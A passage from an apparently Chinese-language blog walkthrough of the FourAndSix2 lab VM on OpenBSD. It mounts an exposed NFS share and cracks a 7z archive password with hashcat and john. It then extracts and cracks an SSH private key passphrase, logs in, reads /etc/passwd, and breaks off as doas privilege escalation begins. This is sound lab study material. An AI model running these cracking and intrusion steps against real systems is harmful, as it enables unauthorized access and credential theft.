class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 192.168.56.111:/home/user/storage /tmp/infosec<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cd</span> /tmp/infosec          <br>                                                                                                                    <br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z<br>                                                                                                                    <br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cp</span> backup.7z /home/kali/Downloads/FourAndSix<br></code></pre></td></tr></table></figure><h2 id="7z-压缩文件爆破"><a href="#7z-压缩文件爆破" class="headerlink" title="7z 压缩文件爆破"></a>7z 压缩文件爆破</h2><p>其中只有一个 backup.7z 文件，将其复制到本地路径下，然后使用 file 命令查看文件类型，使用 <code>7za l</code> 命令查看压缩包里的文件有哪些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file backup.7z <br>backup.7z: 7-zip archive data, version 0.4<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">where</span> 7za                                                                                             <br>/usr/bin/7za<br>/bin/7za<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ 7za l backup.7z <br><br>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21<br>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 62111 bytes (61 KiB)<br><br>Listing archive: backup.7z<br><br>--<br>Path = backup.7z<br>Type = 7z<br>Physical Size = 62111<br>Headers Size = 303<br>Method = LZMA2:16 7zAES<br>Solid = +<br>Blocks = 1<br><br>   Date      Time    Attr         Size   Compressed  Name<br>------------------- ----- ------------ ------------  ------------------------<br>2018-10-28 04:45:33 ....A         9000        61808  hello1.jpeg<br>2018-10-28 04:45:33 ....A         5247               hello2.png<br>2018-10-28 04:45:33 ....A         8903               hello3.jpeg<br>2018-10-28 04:45:33 ....A         8330               hello4.png<br>2018-10-28 04:45:33 ....A        10038               hello5.jpeg<br>2018-10-28 04:45:33 ....A         5931               hello6.png<br>2018-10-28 04:45:33 ....A         6181               hello7.jpeg<br>2018-10-28 04:45:33 ....A         8182               hello8.jpeg<br>2018-10-28 05:50:57 ....A         1856               id_rsa<br>2018-10-28 05:52:57 ....A          398               id_rsa.pub<br>------------------- ----- ------------ ------------  ------------------------<br>2018-10-28 05:52:57              64066        61808  10 files<br><br></code></pre></td></tr></table></figure><p>其中包含了一些图片和 ssh 的公私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ 7za x backup.7z<br><br>7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21<br>p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 62111 bytes (61 KiB)<br><br>Extracting archive: backup.7z<br>--<br>Path = backup.7z<br>Type = 7z<br>Physical Size = 62111<br>Headers Size = 303<br>Method = LZMA2:16 7zAES<br>Solid = +<br>Blocks = 1<br><br>    <br>Enter password (will not be echoed):<br><br></code></pre></td></tr></table></figure><p>尝试解压但是需要密码，直接回车报错，那就使用工具爆破吧，原本想使用 <code>rarcrack</code> 但是爆破速度实在太慢，谷歌了一下，打算使用 hashcat 搭配</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ hashcat -m 11600 7z.<span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>=====================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 5800H with Radeon Graphics, 708/1480 MB (256 MB allocatable), 4MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>clBuildProgram(): CL_BUILD_PROGRAM_FAILURE<br><br>error: unknown target CPU <span class="hljs-string">&#x27;generic&#x27;</span><br>Device pthread-AMD Ryzen 7 5800H with Radeon Graphics failed to build the program, <span class="hljs-built_in">log</span>: error: unknown target CPU <span class="hljs-string">&#x27;generic&#x27;</span><br><br>* Device <span class="hljs-comment">#1: Kernel /usr/share/hashcat/OpenCL/shared.cl build failed.</span><br><br>Started: Tue Jun  6 22:22:43 2023<br>Stopped: Tue Jun  6 22:22:44 2023<br><br></code></pre></td></tr></table></figure><p>hashcat 报错……搜了一下这个问题解决起来比较麻烦，应该是 VMware 的问题，尝试了几种方法都无效，那就在本机下载个 hashcat 来试试吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat.exe -m 11600 7z.<span class="hljs-built_in">hash</span> rockyou.txt<br></code></pre></td></tr></table></figure><p>爆破是有结果了……但是有个更抽象的问题，爆破出来的密码好像是错的，无法解压 7z 文件，换个工具 john 试试吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ john --format=7z -w /usr/share/wordlists/rockyou.txt 7z.<span class="hljs-built_in">hash</span> <br>Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])<br>Cost 1 (iteration count) is 524288 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (padding size) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 3 (compression <span class="hljs-built_in">type</span>) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 4 (data length) is 9488 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Proceeding with wordlist:/usr/share/john/password.lst<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>chocolate        (?)     <br>1g 0:00:00:05 DONE (2023-06-06 22:40) 0.1953g/s 65.62p/s 65.62c/s 65.62C/s benjamin..cruise<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>成功得到密码 <code>chocolate</code>，解压缩成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">ls</span><br>backup.7z    hello2.png   hello4.png   hello6.png   hello8.jpeg  id_rsa.pub<br>hello1.jpeg  hello3.jpeg  hello5.jpeg  hello7.jpeg  id_rsa<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file *.jpeg<br>hello1.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 258x195, components 3<br>hello3.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 227x222, components 3<br>hello5.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 226x223, components 3<br>hello7.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 282x179, components 3<br>hello8.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 204x248, components 3<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ file *.png <br>hello2.png: PNG image data, 257 x 196, 8-bit colormap, non-interlaced<br>hello4.png: PNG image data, 206 x 244, 8-bit colormap, non-interlaced<br>hello6.png: PNG image data, 177 x 232, 8-bit colormap, non-interlaced<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ <span class="hljs-built_in">cat</span> id_rsa.pub <br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDClNemaX//nOugJPAWyQ1aDMgfAS8zrJh++hNeMGCo+TIm9UxVUNwc6vhZ8apKZHOX0Ht+MlHLYdkbwSinmCRmOkm2JbMYA5GNBG3fTNWOAbhd7dl2GPG7NUD+zhaDFyRk5gTqmuFumECDAgCxzeE8r9jBwfX73cETemexWKnGqLey0T56VypNrjvueFPmmrWCJyPcXtoLNQDbbdaWwJPhF0gKGrrWTEZo0NnU1lMAnKkiooDxLFhxOIOxRIXWtDtc61cpnnJHtKeO+9wL2q7JeUQB00KLs9/iRwV6b+kslvHaaQ4TR8IaufuJqmICuE4+v7HdsQHslmIbPKX6HANn user@fourandsix2<br></code></pre></td></tr></table></figure><h2 id="私钥密码爆破"><a href="#私钥密码爆破" class="headerlink" title="私钥密码爆破"></a>私钥密码爆破</h2><p>我们首先应该使用 <code>file</code>，<code>xdg-open</code>，<code>binwalk</code>（捆绑），<code>exiftool</code>（注释内容）来查看图片。</p><p>图片文件应该没什么问题，重点放在公私钥上，使用私钥登录试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh -i id_rsa user@192.168.56.111<br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.111 (192.168.56.111)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:bYL1jAzqEuvAJUa0fNrhsGN1637L223ZIavvbfsCL0g.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.111<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Enter passphrase for key &#x27;</span>id_rsa<span class="hljs-string">&#x27;:</span><br></code></pre></td></tr></table></figure><p>私钥被加密了，那我们再来一次爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh2john id_rsa &gt;rsa_hash<br></code></pre></td></tr></table></figure><p>好像不太好直接指定 john 的 format 参数，那就交给 john 自己来测试吧。再次遇到小问题，session 直接结束了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Using default input encoding: UTF-8<br>Loaded 402687 password hashes with no different salts (tripcode [DES 128/128 AVX])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Will run 4 OpenMP threads<br>Proceeding with wordlist:/usr/share/john/password.lst<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2023-06-06 22:52) 0g/s 354200p/s 354200c/s 142631MC/s 123456..sss<br>Session completed.<br></code></pre></td></tr></table></figure><p>不清楚造成的原因是什么，但是使用 sudo 来运行 john 命令就破解成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>12345678         (id_rsa)     <br>1g 0:00:00:00 DONE (2023-06-06 22:55) 1.111g/s 35.55p/s 35.55c/s 35.55C/s 123456..butterfly<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>得到了密码，再次尝试 ssh 私钥登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/FourAndSix]<br>└─$ ssh -i id_rsa user@192.168.56.111        <br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Last login: Mon Oct 29 13:53:51 2018 from 192.168.1.114<br>OpenBSD 6.4 (GENERIC) <span class="hljs-comment">#349: Thu Oct 11 13:25:13 MDT 2018</span><br><br>Welcome to OpenBSD: The proactively secure Unix-like operating system.<br><br>Please use the sendbug(1) utility to report bugs <span class="hljs-keyword">in</span> the system.<br>Before reporting a bug, please try to reproduce it with the latest<br>version of the code.  With bug reports, please try to ensure that<br>enough information to reproduce the problem is enclosed, and <span class="hljs-keyword">if</span> a<br>known fix <span class="hljs-keyword">for</span> it exists, include that as well.<br><br>fourandsix2$ <span class="hljs-built_in">whoami</span><br>user<br>fourandsix2$ <span class="hljs-built_in">id</span><br>uid=1000(user) gid=1000(user) <span class="hljs-built_in">groups</span>=1000(user), 0(wheel)<br><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>接下来考虑提权操作，首先进行 Getshell 后的信息收集，当前路径的文件收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">ls</span><br>storage<br>fourandsix2$ <span class="hljs-built_in">pwd</span><br>/home/user<br>fourandsix2$ <span class="hljs-built_in">ls</span> -liah<br>total 40<br>129920 drwxr-xr-x  4 user  user    512B Oct 29  2018 .<br>     2 drwxr-xr-x  3 root  wheel   512B Oct 29  2018 ..<br>129923 -rw-r--r--  1 user  user     87B Oct 11  2018 .Xdefaults<br>129924 -rw-r--r--  1 user  user    771B Oct 11  2018 .cshrc<br>129925 -rw-r--r--  1 user  user    101B Oct 11  2018 .cvsrc<br>129926 -rw-r--r--  1 user  user    359B Oct 11  2018 .login<br>129927 -rw-r--r--  1 user  user    175B Oct 11  2018 .mailrc<br>129928 -rw-r--r--  1 user  user    215B Oct 11  2018 .profile<br>129921 drwx------  2 user  user    512B Oct 29  2018 .ssh<br>129929 drwxr-xr-x  2 user  user    512B Oct 29  2018 storage<br>fourandsix2$ <span class="hljs-built_in">cd</span> storage/                                                                                           <br>fourandsix2$ <span class="hljs-built_in">ls</span> -liah<br>total 132<br>129929 drwxr-xr-x  2 user  user   512B Oct 29  2018 .<br>129920 drwxr-xr-x  4 user  user   512B Oct 29  2018 ..<br>129930 -rw-r--r--  1 user  user  60.7K Oct 29  2018 backup.7z<br></code></pre></td></tr></table></figure><p>passwd 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:*:0:0:Charlie &amp;:/root:/bin/ksh<br>daemon:*:1:1:The devil himself:/root:/sbin/nologin<br>operator:*:2:5:System &amp;:/operator:/sbin/nologin<br>bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin<br>build:*:21:21:base and xenocara build:/var/empty:/bin/ksh<br>sshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin<br>_portmap:*:28:28:portmap:/var/empty:/sbin/nologin<br>_identd:*:29:29:identd:/var/empty:/sbin/nologin<br>_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin<br>_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin<br>_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin<br>_x11:*:35:35:X Server:/var/empty:/sbin/nologin<br>_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin<br>_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin<br>_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin<br>_rebound:*:52:52:Rebound DNS Daemon:/var/empty:/sbin/nologin<br>_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin<br>_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin<br>_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin<br>_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin<br>_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin<br>_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin<br>_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin<br>www:*:67:67:HTTP Server:/var/www:/sbin/nologin<br>_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin<br>_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin<br>_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin<br>_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin<br>_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin<br>_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin<br>_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin<br>_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin<br>_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin<br>_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin<br>_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin<br>_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin<br>_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin<br>_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin<br>_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin<br>_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin<br>_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin<br>_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin<br>_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin<br>_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin<br>_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin<br>_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin<br>_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin<br>_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin<br>_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin<br>_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin<br>_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin<br>_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin<br>_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin<br>_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin<br>_file:*:104:104:file privsep:/var/empty:/sbin/nologin<br>_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin<br>_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin<br>_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin<br>_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin<br>_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin<br>_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin<br>_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin<br>_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin<br>nobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin<br>user:*:1000:1000:user:/home/user:/bin/ksh<br></code></pre></td></tr></table></figure><p>没有定时任务？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span>: /etc/crontab: No such file or directory<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">fourandsix2$ <span class="hljs-built_in">ls</span><br>acme               firmware           ldap               mtree              random.seed        skel<br>acme-client.conf   fstab              localtime          myname             rc                 soii.key<br>amd                ftpusers           locate.rc          netstart           rc.conf            spwd.db<br>authpf             gettytab           login.conf         newsyslog.conf     rc.conf.local      ssh<br>changelist         group              magic              npppd              rc.d               ssl<br>daily              hostname.em0       mail               ntpd.conf          resolv.conf        syslog.conf<br>disktab            hosts              mail.rc            passwd             resolv.conf.tail   termcap<br>doas.conf          hotplug            mailer.conf        pf.conf            rmt                ttys<br>dumpdates          iked               master.passwd      pf.os              rpc                usermgmt.conf<br>examples           installurl         moduli             ppp                services           weekly<br>exports            isakmpd            monthly            protocols          shells<br>fbtab              ksh.kshrc          motd               pwd.db             signify<br></code></pre></td></tr></table></figure><h3 id="doas-提权"><a href="#doas-提权" class="headerlink" title="doas 提权"></a>doas 提权</h3><p>etc 目录下确实没有定时任务的文件和目录，但是看到了一个特殊的文件，昨天刚刚遇到过这个提权手法 <code>doas.conf</code></p><figure class="highlight bash"><table><tr><td 